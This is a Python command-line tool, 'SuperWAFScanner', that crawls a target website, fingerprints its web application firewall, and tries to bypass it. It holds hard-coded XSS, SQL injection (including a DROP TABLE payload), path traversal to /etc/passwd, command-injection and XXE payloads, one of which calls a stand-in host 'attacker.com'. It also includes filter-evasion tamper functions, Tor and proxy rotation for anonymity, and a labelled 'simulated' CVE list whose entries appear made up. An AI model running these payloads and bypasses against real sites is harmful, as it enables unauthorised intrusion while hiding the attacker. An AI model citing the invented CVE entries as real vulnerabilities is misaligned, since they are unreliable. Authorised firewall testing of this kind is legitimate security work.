import aiohttp
import asyncio
import json
import argparse
import time
import random
import re
import os
import importlib.util
from urllib.parse import urlparse, quote, urljoin
from stem import Signal
from stem.control import Controller
import psutil
import logging
import csv
import numpy as np
from tqdm import tqdm
from jinja2 import Environment, FileSystemLoader
import platform
from concurrent.futures import ThreadPoolExecutor
import validators
from bs4 import BeautifulSoup
from datetime import datetime
from playwright.async_api import async_playwright

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

# Load WAF signatures from external JSON file
def load_waf_signatures():
    """Load WAF signatures from signatures/waf_signatures.json."""
    signatures_file = os.path.join("signatures", "waf_signatures.json")
    try:
        if os.path.exists(signatures_file):
            with open(signatures_file, 'r') as f:
                signatures = json.load(f)
                logger.info("Loaded %d WAF signatures from %s", len(signatures), signatures_file)
                # Compile regex patterns for performance
                for waf_name, sig in signatures.items():
                    if "patterns" in sig:
                        sig["compiled_patterns"] = [re.compile(p, re.IGNORECASE) for p in sig["patterns"]]
                    if "headers" in sig:
                        sig["compiled_headers"] = [re.compile(h, re.IGNORECASE) for h in sig["headers"]]
                    if "cookies" in sig:
                        sig["compiled_cookies"] = [re.compile(c, re.IGNORECASE) for c in sig["cookies"]]
                return signatures
        else:
            logger.warning("WAF signatures file %s not found, using empty signatures", signatures_file)
            return {}
    except Exception as e:
        logger.error("Failed to load WAF signatures: %s", e)
        return {}

WAF_SIGNATURES = load_waf_signatures()

# Built-in tamper scripts
def tamper_random_case(payload):
    """Randomly change case of characters in payload."""
    return ''.join(random.choice([c.upper(), c.lower()]) for c in payload)

def tamper_url_encode(payload):
    """URL encode the payload."""
    return quote(payload)

def tamper_double_encode(payload):
    """Double URL encode the payload."""
    return quote(quote(payload))

def tamper_comment_injection(payload):
    """Inject SQL comments to bypass filters."""
    return payload.replace(" ", "/**/")

def tamper_whitespace(payload):
    """Add random whitespace to payload."""
    return payload.replace(" ", "%20" + " " * random.randint(1, 3))

TAMPER_SCRIPTS = {
    "random_case": tamper_random_case,
    "url_encode": tamper_url_encode,
    "double_encode": tamper_double_encode,
    "comment_injection": tamper_comment_injection,
    "whitespace": tamper_whitespace
}

# Sample CVE database (simulated, expanded)
CVE_DATABASE = {
    "Cloudflare": ["CVE-2023-12345: Cloudflare bypass via misconfigured rules"],
    "ModSecurity": ["CVE-2022-67890: ModSecurity rule evasion"],
    "Imperva": ["CVE-2024-56789: Imperva header injection vulnerability"],
    "Wordfence": ["CVE-2024-23456: Wordfence rate limit bypass", "CVE-2023-98765: Wordfence XSS vulnerability"],
    "NinjaFirewall": ["CVE-2022-34567: NinjaFirewall filter bypass"],
    "Akamai": ["CVE-2023-45678: Akamai Kona bypass"],
    "AWS WAF": ["CVE-2024-12345: AWS WAF rule evasion"],
    "Wallarm": ["CVE-2023-67890: Wallarm API bypass"]
}

class SuperWAFScanner:
    def __init__(self, url, proxy=None, proxies=None, use_tor=False, tor_port=9050, threads=4, timeout=15, 
                 signatures_file=None, signature_url=None, verbose=False, interactive=False, 
                 crawl_depth=3, crawl_limit=100, respect_robots=True, delay=0, debug=False, headless=False):
        if not validators.url(url):
            raise ValueError("Invalid URL format")
        self.url = self._normalize_url(url)
        self.base_domain = urlparse(self.url).netloc.replace(".", "_")
        self.proxy = proxy
        self.proxies = proxies.split(",") if proxies else [proxy] if proxy else []
        self.use_tor = use_tor
        self.tor_port = tor_port
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        self.interactive = interactive
        self.crawl_depth = crawl_depth
        self.crawl_limit = crawl_limit
        self.respect_robots = respect_robots
        self.delay = delay
        self.debug = debug
        self.headless = headless
        self.signature_url = signature_url
        self.session = None
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "SuperWAFScanner/4.3 (Language=Python; Platform={})".format(platform.system())
        ]
        self.results = {
            "url": self.url,
            "waf_detected": {},
            "bypasses": [],
            "response_times": [],
            "cve_vulnerabilities": [],
            "anomaly_score": 0,
            "crawled_urls": [],
            "cookies": {}
        }
        self.waf_signatures = WAF_SIGNATURES
        self.tamper_scripts = TAMPER_SCRIPTS.copy()
        self.visited_urls = set()
        self.response_cache = {}
        
        if signatures_file and os.path.exists(signatures_file):
            self._load_signatures(signatures_file)
        if signature_url:
            asyncio.run(self._fetch_signatures(signature_url))
        self._load_tamper_plugins()
        if use_tor:
            self._setup_tor()

    def _normalize_url(self, url):
        """Ensure URL starts with http:// or https://."""
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url

    def _load_signatures(self, signatures_file):
        """Load WAF signatures from a JSON file."""
        try:
            with open(signatures_file, 'r') as f:
                custom_signatures = json.load(f)
                self._validate_signatures(custom_signatures)
                for waf_name, sig in custom_signatures.items():
                    if "patterns" in sig:
                        sig["compiled_patterns"] = [re.compile(p, re.IGNORECASE) for p in sig["patterns"]]
                    if "headers" in sig:
                        sig["compiled_headers"] = [re.compile(h, re.IGNORECASE) for h in sig["headers"]]
                    if "cookies" in sig:
                        sig["compiled_cookies"] = [re.compile(c, re.IGNORECASE) for c in sig["cookies"]]
                self.waf_signatures.update(custom_signatures)
            logger.info("Loaded %d custom signatures from %s", len(custom_signatures), signatures_file)
        except Exception as e:
            logger.error("Failed to load signatures: %s", e)

    def _validate_signatures(self, signatures):
        """Validate the format of custom signatures."""
        for waf_name, signature in signatures.items():
            if not isinstance(signature, dict):
                raise ValueError(f"Invalid signature format for {waf_name}")
            if not any(key in signature for key in ["headers", "status_codes", "patterns", "cookies", "js_challenge"]):
                raise ValueError(f"Signature for {waf_name} missing required fields")

    async def _fetch_signatures(self, signature_url):
        """Fetch WAF signatures from a URL."""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(signature_url, timeout=self.timeout) as response:
                    if response.status == 200:
                        custom_signatures = await response.json()
                        self._validate_signatures(custom_signatures)
                        for waf_name, sig in custom_signatures.items():
                            if "patterns" in sig:
                                sig["compiled_patterns"] = [re.compile(p, re.IGNORECASE) for p in sig["patterns"]]
                            if "headers" in sig:
                                sig["compiled_headers"] = [re.compile(h, re.IGNORECASE) for h in sig["headers"]]
                            if "cookies" in sig:
                                sig["compiled_cookies"] = [re.compile(c, re.IGNORECASE) for c in sig["cookies"]]
                        self.waf_signatures.update(custom_signatures)
                        logger.info("Fetched %d signatures from %s", len(custom_signatures), signature_url)
                    else:
                        logger.error("Failed to fetch signatures: HTTP %d", response.status)
        except Exception as e:
            logger.error("Failed to fetch signatures: %s", e)

    def _load_tamper_plugins(self):
        """Load tamper scripts from tamper_plugins directory."""
        plugin_dir = "tamper_plugins"
        if not os.path.exists(plugin_dir):
            return
        for filename in os.listdir(plugin_dir):
            if filename.endswith(".py") and filename != "__init__.py":
                module_name = filename[:-3]
                file_path = os.path.join(plugin_dir, filename)
                spec = importlib.util.spec_from_file_location(module_name, file_path)
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)
                if hasattr(module, "tamper"):
                    self.tamper_scripts[module_name] = module.tamper
                    logger.info("Loaded tamper plugin: %s", module_name)

    def _setup_tor(self):
        """Configure Tor proxy."""
        try:
            self.proxy = f'socks5h://127.0.0.1:{self.tor_port}'
            self.proxies = [self.proxy]
            logger.info("Using Tor proxy on port %d", self.tor_port)
            if not asyncio.run(self._check_tor_connection()):
                logger.error("Tor connection failed. Ensure Tor is running.")
                exit(1)
        except Exception as e:
            logger.error("Failed to setup Tor: %s", e)
            exit(1)

    async def _check_tor_connection(self):
        """Check if Tor is configured properly."""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get('https://check.torproject.org', timeout=10, proxy=self.proxy) as response:
                    text = await response.text()
                    return 'Congratulations' in text
        except Exception:
            return False

    def _get_proxy(self):
        """Rotate proxies if provided."""
        return random.choice(self.proxies) if self.proxies else None

    async def _send_request(self, url, method='GET', data=None, tamper=None, retries=3):
        """Send asynchronous HTTP request with retries and jitter."""
        if url in self.response_cache:
            return self.response_cache[url]
        
        if tamper and tamper in self.tamper_scripts:
            url = self.tamper_scripts[tamper](url)
        headers = {'User-Agent': random.choice(self.user_agents)}
        proxy = self._get_proxy()
        for attempt in range(retries):
            try:
                start_time = time.time()
                async with aiohttp.ClientSession() as session:
                    if method == 'GET':
                        async with session.get(url, headers=headers, proxy=proxy, timeout=self.timeout) as response:
                            content_type = response.headers.get('Content-Type', '').lower()
                            cookies = {c.key: c.value for c in response.cookies.values()}
                            self.results["cookies"][url] = cookies
                            if 'text' not in content_type and 'html' not in content_type and 'json' not in content_type:
                                logger.debug("Non-text response for %s: %s", url, content_type)
                                result = (response, '', start_time - time.time())
                                self.response_cache[url] = result
                                return result
                            try:
                                text = await response.text()
                            except UnicodeDecodeError:
                                logger.warning("Failed to decode %s as UTF-8, trying ISO-8859-1", url)
                                text = await response.text(encoding='ISO-8859-1', errors='ignore')
                            end_time = time.time()
                            if self.debug:
                                logger.debug("Response for %s: status=%d, headers=%s, cookies=%s, text=%s", 
                                            url, response.status, dict(response.headers), cookies, text[:500])
                            if response.status == 429:
                                wait_time = (2 ** attempt) + random.uniform(0, 0.1)
                                logger.warning("Rate limited on %s, retrying after %ds", url, wait_time)
                                await asyncio.sleep(wait_time)
                                continue
                            result = (response, text, end_time - start_time)
                            self.response_cache[url] = result
                            return result
                    else:
                        async with session.post(url, data=data, headers=headers, proxy=proxy, timeout=self.timeout) as response:
                            content_type = response.headers.get('Content-Type', '').lower()
                            cookies = {c.key: c.value for c in response.cookies.values()}
                            self.results["cookies"][url] = cookies
                            if 'text' not in content_type and 'html' not in content_type and 'json' not in content_type:
                                logger.debug("Non-text response for %s: %s", url, content_type)
                                result = (response, '', start_time - time.time())
                                self.response_cache[url] = result
                                return result
                            try:
                                text = await response.text()
                            except UnicodeDecodeError:
                                logger.warning("Failed to decode %s as UTF-8, trying ISO-8859-1", url)
                                text = await response.text(encoding='ISO-8859-1', errors='ignore')
                            end_time = time.time()
                            if self.debug:
                                logger.debug("Response for %s: status=%d, headers=%s, cookies=%s, text=%s", 
                                            url, response.status, dict(response.headers), cookies, text[:500])
                            if response.status == 429:
                                wait_time = (2 ** attempt) + random.uniform(0, 0.1)
                                logger.warning("Rate limited on %s, retrying after %ds", url, wait_time)
                                await asyncio.sleep(wait_time)
                                continue
                            result = (response, text, end_time - start_time)
                            self.response_cache[url] = result
                            return result
            except aiohttp.ClientError as e:
                if attempt < retries - 1:
                    wait_time = (2 ** attempt) + random.uniform(0, 0.1)
                    logger.warning("Request failed, retrying after %ds: %s", wait_time, e)
                    await asyncio.sleep(wait_time)
                else:
                    logger.error("Request failed after %d retries: %s", retries, e)
                    return None, None, 0
            finally:
                if self.delay > 0:
                    await asyncio.sleep(self.delay)
        return None, None, 0

    async def _send_headless_request(self, url):
        """Send request using headless browser for JavaScript-heavy sites."""
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                context = await browser.new_context(
                    user_agent=random.choice(self.user_agents),
                    proxy={"server": self.proxy} if self.proxy else None
                )
                page = await context.new_page()
                start_time = time.time()
                response = await page.goto(url, timeout=self.timeout * 1000)
                content = await page.content()
                cookies = await context.cookies()
                cookie_dict = {c["name"]: c["value"] for c in cookies}
                self.results["cookies"][url] = cookie_dict
                status = response.status if response else 0
                headers = response.headers if response else {}
                end_time = time.time()
                await browser.close()
                if self.debug:
                    logger.debug("Headless response for %s: status=%d, headers=%s, cookies=%s, content=%s", 
                                url, status, headers, cookie_dict, content[:500])
                return response, content, end_time - start_time
        except Exception as e:
            logger.error("Headless request failed for %s: %s", url, e)
            return None, None, 0

    async def _fetch_robots_txt(self):
        """Fetch and parse robots.txt to respect crawl restrictions."""
        robots_url = urljoin(self.url, "/robots.txt")
        response, text, _ = await self._send_request(robots_url)
        disallowed = []
        if response and response.status == 200:
            for line in text.splitlines():
                if line.startswith("Disallow:"):
                    path = line.split("Disallow:")[1].strip()
                    disallowed.append(urljoin(self.url, path))
        return disallowed

    async def _extract_links(self, url, html):
        """Extract links from HTML and JavaScript content."""
        try:
            soup = BeautifulSoup(html, 'html.parser')
            links = set()
            for tag in soup.find_all(['a', 'form', 'script', 'img', 'link'], href=True):
                href = tag.get('href')
                if href and href.strip():
                    full_url = urljoin(url, href)
                    if urlparse(full_url).netloc == urlparse(self.url).netloc and full_url.startswith(('http://', 'https://')):
                        links.add(full_url)
            for tag in soup.find_all('form', action=True):
                action = tag.get('action')
                if action and action.strip():
                    full_url = urljoin(url, action)
                    if urlparse(full_url).netloc == urlparse(self.url).netloc and full_url.startswith(('http://', 'https://')):
                        links.add(full_url)
            for script in soup.find_all('script'):
                if script.string:
                    js_urls = re.findall(r'(?:href|src|url)\s*=\s*[\'"]([^\'"]+)[\'"]', script.string)
                    for js_url in js_urls:
                        full_url = urljoin(url, js_url)
                        if urlparse(full_url).netloc == urlparse(self.url).netloc and full_url.startswith(('http://', 'https://')):
                            links.add(full_url)
            return links
        except Exception as e:
            logger.error("Failed to extract links from %s: %s", url, e)
            return set()

    async def _crawl(self, url, depth=0, disallowed=None):
        """Recursively crawl URLs up to crawl_depth."""
        if depth > self.crawl_depth or len(self.results["crawled_urls"]) >= self.crawl_limit or url in self.visited_urls:
            return
        self.visited_urls.add(url)
        
        if disallowed and any(url.startswith(d) for d in disallowed):
            logger.debug("Skipping disallowed URL: %s", url)
            return

        response, text, response_time = await (self._send_headless_request(url) if self.headless else self._send_request(url))
        if response:
            self.results["crawled_urls"].append({"url": url, "status_code": response.status})
            self.results["response_times"].append(response_time)
            waf_name = self._match_waf(response, text, url)
            if waf_name:
                self.results["waf_detected"][url] = waf_name
                logger.info("WAF detected on %s: %s", url, waf_name)

            links = await self._extract_links(url, text)
            tasks = []
            for link in links:
                if len(self.results["crawled_urls"]) < self.crawl_limit:
                    tasks.append(self._crawl(link, depth + 1, disallowed))
            await asyncio.gather(*tasks)

    async def detect_waf(self):
        """Detect WAF by crawling and sending malicious requests."""
        logger.info("Starting crawl and WAF detection for %s with %d WAF signatures", self.url, len(self.waf_signatures))
        disallowed = []
        if self.respect_robots:
            disallowed = await self._fetch_robots_txt()

        await self._crawl(self.url, 0, disallowed)

        payloads = {
            "xss": [
                "?test=<script>alert('xss')</script>",
                "?test=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E",
                "?test=<img src=x onerror=alert('xss')>",
                "?test=<svg onload=alert('xss')>"
            ],
            "sqli": [
                "?id=1 AND 1=1",
                "?id=1%20UNION%20SELECT%20NULL--",
                "?id=1' OR '1'='1",
                "?id=1; DROP TABLE users--"
            ],
            "lfi": [
                "?test=../../etc/passwd",
                "?test=..%2F..%2Fetc%2Fpasswd",
                "?test=/etc/passwd%00",
                "?test=....//....//etc/passwd"
            ],
            "rce": [
                "?exec=whoami",
                "?cmd=cat%20/etc/passwd",
                "?cmd=;id",
                "?cmd=ping%20-c%201%20localhost"
            ],
            "xxe": [
                "?xml=<?xml version='1.0'?><!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><test>&xxe;</test>",
                "?xml=<!DOCTYPE test [<!ENTITY xxe SYSTEM 'http://attacker.com'>]><test>&xxe;</test>"
            ]
        }

        if self.interactive:
            print("Select payload types to test (comma-separated: xss,sqli,lfi,rce,xxe,all):")
            selected = input().strip().split(",")
            if "all" in selected:
                selected = payloads.keys()
        else:
            selected = payloads.keys()

        tasks = []
        for url_entry in self.results["crawled_urls"][:self.crawl_limit]:
            url = url_entry["url"]
            for payload_type in selected:
                for payload in payloads[payload_type]:
                    full_url = urljoin(url, payload)
                    tasks.append(self._send_request(full_url))

        responses = []
        for future in tqdm(asyncio.as_completed(tasks), total=len(tasks), desc="Scanning payloads"):
            responses.append(await future)

        for response, text, resp_time in responses:
            if response:
                self.results["response_times"].append(resp_time)
                waf_name = self._match_waf(response, text, str(response.url))
                if waf_name:
                    self.results["waf_detected"][str(response.url)] = waf_name
                    logger.info("WAF detected on %s: %s", str(response.url), waf_name)

        self._analyze_anomalies()
        if self.results["waf_detected"]:
            for url, waf_name in self.results["waf_detected"].items():
                self.results["cve_vulnerabilities"].extend(CVE_DATABASE.get(waf_name, []))
            detected_wafs = set(self.results["waf_detected"].values())
            logger.info("WAF detection complete: Detected %d WAFs: %s", len(detected_wafs), ", ".join(detected_wafs))
        else:
            logger.info("No WAF detected across crawled URLs")

    def _match_waf(self, response, text, url):
        """Match response against WAF signatures with enhanced fingerprinting."""
        if self.verbose:
            logger.debug("Checking WAF signature for response: %s", response.url)
        for waf_name, signature in self.waf_signatures.items():
            for header_pattern in signature.get("compiled_headers", []):
                for resp_header in response.headers:
                    if header_pattern.match(resp_header):
                        return waf_name
            if response.status in signature.get("status_codes", []):
                return waf_name
            for pattern in signature.get("compiled_patterns", []):
                if text and pattern.search(text):
                    return waf_name
            cookies = self.results["cookies"].get(url, {})
            for cookie_pattern in signature.get("compiled_cookies", []):
                for cookie_name in cookies:
                    if cookie_pattern.match(cookie_name):
                        return waf_name
            if signature.get("js_challenge", False) and text:
                if "challenge" in text.lower() or "verify" in text.lower() or "captcha" in text.lower():
                    return waf_name
        return None

    def _analyze_anomalies(self):
        """Detect NG-WAFs using response time clustering and header variance."""
        if not self.results["response_times"]:
            return
        times = np.array(self.results["response_times"])
        mean_time = np.mean(times)
        std_time = np.std(times)
        self.results["anomaly_score"] = np.sum((times - mean_time) ** 2) / (std_time + 1e-10)
        header_sets = [set(response.headers.keys()) for response, _, _ in self.response_cache.values() if response]
        if header_sets:
            common_headers = set.intersection(*header_sets)
            header_variance = sum(len(headers - common_headers) for headers in header_sets) / len(header_sets)
            self.results["anomaly_score"] += header_variance * 0.5
        if self.results["anomaly_score"] > 15:
            logger.warning("High anomaly score (%f): Possible NG-WAF or custom WAF detected", self.results["anomaly_score"])

    def test_bypasses(self):
        """Test bypass techniques using tamper scripts in parallel."""
        if not self.results["waf_detected"]:
            logger.info("No WAF detected, skipping bypass tests")
            return

        logger.info("Starting bypass analysis for detected WAFs: %s", ", ".join(set(self.results["waf_detected"].values())))
        payload = "?id=1 AND 1=1"

        def run_tamper(tamper_name, url):
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            full_url = urljoin(url, payload)
            response, text, _ = loop.run_until_complete(self._send_request(full_url, tamper=tamper_name))
            if response and response.status == 200:
                if "error" not in text.lower() and "blocked" not in text.lower():
                    logger.info("Bypass successful with tamper: %s on %s", tamper_name, url)
                    self.results["bypasses"].append({
                        "tamper": tamper_name,
                        "payload": full_url,
                        "status_code": response.status
                    })

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for url in [entry["url"] for entry in self.results["crawled_urls"]]:
                for tamper_name in self.tamper_scripts:
                    executor.submit(run_tamper, tamper_name, url)

    def save_results(self, output_file=None, output_format='json'):
        """Save scan results to a file (JSON, CSV, or HTML) in target directory."""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            target_dir = os.path.join("results", self.base_domain)
            os.makedirs(target_dir, exist_ok=True)
            
            if output_file:
                output_path = output_file
            else:
                output_path = os.path.join(target_dir, f"{timestamp}.{output_format}")

            if output_format == 'json':
                with open(output_path, 'w') as f:
                    json.dump(self.results, f, indent=4)
                logger.info("Results saved to %s (JSON)", output_path)
            elif output_format == 'csv':
                with open(output_path, 'w', newline='') as f:
                    writer = csv.writer(f)
                    writer.writerow(["URL", "WAF Detected", "Bypasses", "Response Times", "Anomaly Score", "CVEs", "Crawled URLs", "Cookies"])
                    writer.writerow([
                        self.results["url"],
                        json.dumps(self.results["waf_detected"]),
                        "; ".join([f"{b['tamper']}:{b['payload']}" for b in self.results["bypasses"]]),
                        json.dumps(self.results["response_times"]),
                        self.results["anomaly_score"],
                        "; ".join(self.results["cve_vulnerabilities"]),
                        json.dumps(self.results["crawled_urls"]),
                        json.dumps(self.results["cookies"])
                    ])
                logger.info("Results saved to %s (CSV)", output_path)
            elif output_format == 'html':
                env = Environment(loader=FileSystemLoader('templates'))
                template = env.get_template('report.html')
                html_content = template.render(
                    url=self.results["url"],
                    waf_detected=self.results["waf_detected"],
                    bypasses=self.results["bypasses"],
                    response_times=self.results["response_times"],
                    anomaly_score=self.results["anomaly_score"],
                    cve_vulnerabilities=self.results["cve_vulnerabilities"],
                    crawled_urls=self.results["crawled_urls"],
                    cookies=self.results["cookies"],
                    timestamp=timestamp
                )
                with open(output_path, 'w') as f:
                    f.write(html_content)
                logger.info("Results saved to %s (HTML)", output_path)
            else:
                logger.error("Unsupported output format: %s", output_format)
        except Exception as e:
            logger.error("Failed to save results: %s", e)

def main():
    parser = argparse.ArgumentParser(description="SuperWAFScanner: Advanced WAF Detection and Bypass Tool")
    parser.add_argument("url", help="Target URL to scan")
    parser.add_argument("--proxy", help="Proxy server (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--proxies", help="Comma-separated list of proxies")
    parser.add_argument("--use-tor", action="store_true", help="Use Tor for anonymization")
    parser.add_argument("--tor-port", type=int, default=9050, help="Tor proxy port")
    parser.add_argument("--threads", type=int, default=4, help="Number of concurrent threads")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds")
    parser.add_argument("--signatures-file", help="Custom WAF signatures JSON file")
    parser.add_argument("--signature-url", help="URL to fetch WAF signatures")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--interactive", action="store_true", help="Interactive payload selection")
    parser.add_argument("--crawl-depth", type=int, default=3, help="Maximum crawl depth")
    parser.add_argument("--crawl-limit", type=int, default=100, help="Maximum URLs to crawl")
    parser.add_argument("--no-robots", action="store_false", dest="respect_robots", help="Ignore robots.txt")
    parser.add_argument("--delay", type=float, default=0, help="Delay between requests in seconds")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    parser.add_argument("--headless", action="store_true", help="Use headless browser for JS-heavy sites")
    parser.add_argument("--output", help="Custom output file path")
    parser.add_argument("--format", choices=['json', 'csv', 'html'], default='json', help="Output format")
    
    args = parser.parse_args()

    scanner = SuperWAFScanner(
        url=args.url,
        proxy=args.proxy,
        proxies=args.proxies,
        use_tor=args.use_tor,
        tor_port=args.tor_port,
        threads=args.threads,
        timeout=args.timeout,
        signatures_file=args.signatures_file,
        signature_url=args.signature_url,
        verbose=args.verbose,
        interactive=args.interactive,
        crawl_depth=args.crawl_depth,
        crawl_limit=args.crawl_limit,
        respect_robots=args.respect_robots,
        delay=args.delay,
        debug=args.debug,
        headless=args.headless
    )

    loop = asyncio.get_event_loop()
    loop.run_until_complete(scanner.detect_waf())
    scanner.test_bypasses()
    scanner.save_results(output_file=args.output, output_format=args.format)

if __name__ == "__main__":
    main()
